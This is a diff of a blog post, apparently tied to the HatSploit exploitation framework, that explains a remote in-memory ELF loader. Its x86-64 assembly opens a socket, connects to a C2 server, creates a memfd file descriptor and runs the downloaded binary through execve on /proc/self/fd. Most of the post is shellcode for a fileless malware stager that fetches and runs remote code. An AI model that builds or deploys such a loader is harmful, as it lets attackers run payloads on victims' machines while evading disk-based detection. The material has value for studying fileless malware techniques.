@@ -2,9 +2,9 @@
 layout: post
 title: Remote in-memory ELF loader
 subtitle: Using procfs to execute ELF without touching the disk
-gh-repo: entysec/pawn
+gh-repo: entysec/hatsploit
 gh-badge: [star, fork]
-tags: [hatsploit, pwny, pawn, malware]
+tags: [hatsploit, pwny, malware]
 comments: false
 ---
 
@@ -43,29 +43,35 @@ Let's begin writing our shellcode.
 
 First step is to set up socket for further communication:
 
-```assembly
-push 0x29
-pop rax
-cdq
-push 0x2
-pop rdi
-push 0x1
-pop rsi
-syscall
+```nasm
+.equ SYS_SOCKET     0x29
+.equ AF_INET        0x2
+.equ SOCK_STREAM    0x1
+
+_sys_socket:
+    push SYS_SOCKET
+    pop rax
+    cdq
+    push AF_INET
+    pop rdi
+    push SOCK_STREAM
+    pop rsi
+    syscall
 ```
 
 Now, we are ready to connect to our C2 server:
 
-```assembly
-xchg rdi, rax
-movabs rcx, C2_addr
-push rcx
-mov rsi, rsp
-push 0x10
-pop rdx
-push 0x2a
-pop rax
-syscall
+```nasm
+_sys_connect:
+    xchg rdi, rax
+    movabs rcx, C2_ADDR
+    push rcx
+    mov rsi, rsp
+    push 0x10
+    pop rdx
+    push 0x2a
+    pop rax
+    syscall
 ```
 
 Lets imagine that we now read ELF file length and have it in the `r12` register.
@@ -73,22 +79,26 @@ Moreover, we have already allocated memory using `mmap` and have address pointin
 Then, we have already read ELF data to the allocated memory and the next step is to create file descriptor.
 For this purpose we are gonna use `memfd_create` system call:
 
-```assembly
-xor rax, rax
-push rax
-push rsp
-sub rsp, 8
-mov rdi, rsp
-push 0x13f
-pop rax
-xor rsi, rsi
-syscall
+```nasm
+.equ SYS_MEMFD 0x13f
+.equ FILE_SIZE 0x8
+
+_sys_memfd:
+    xor rax, rax
+    push rax
+    push rsp
+    sub rsp, FILE_SIZE
+    mov rdi, rsp
+    push SYS_MEMFD
+    pop rax
+    xor rsi, rsi
+    syscall
 ```
 
 Then we save our file descriptor to `r14` via `push rax; pop r14` and then we need to write our ELF data from the allocated memory right to the file descriptor.
 After all these steps done, we need to concatenate `/proc/self/fd/` and our file descriptor. There are different ways to do this, but in our case we'll use stack:
 
-```assembly
+```nasm
 add rsp, 16
 mov qword ptr [rsp], 0x6f72702f
 mov qword ptr [rsp+4], 0x65732f63
@@ -100,15 +110,18 @@ Then we need to convert our file descriptor to the string and append it to the s
 
 Now, we are ready to execute our file descriptor using `execve`:
 
-```assembly
-lea rdi, [rsp]
-push 0x3b
-pop rax
-cdq
-push rdx
-push rdi
-mov rsi, rsp
-syscall
+```nasm
+.equ SYS_EXECVE 0x3b
+
+_sys_execve:
+    lea rdi, [rsp]
+    push SYS_EXECVE
+    pop rax
+    cdq
+    push rdx
+    push rdi
+    mov rsi, rsp
+    syscall
 ```
 
 First instruction puts path `/proc/self/fd/<fd>` to the first argument of `execve`.
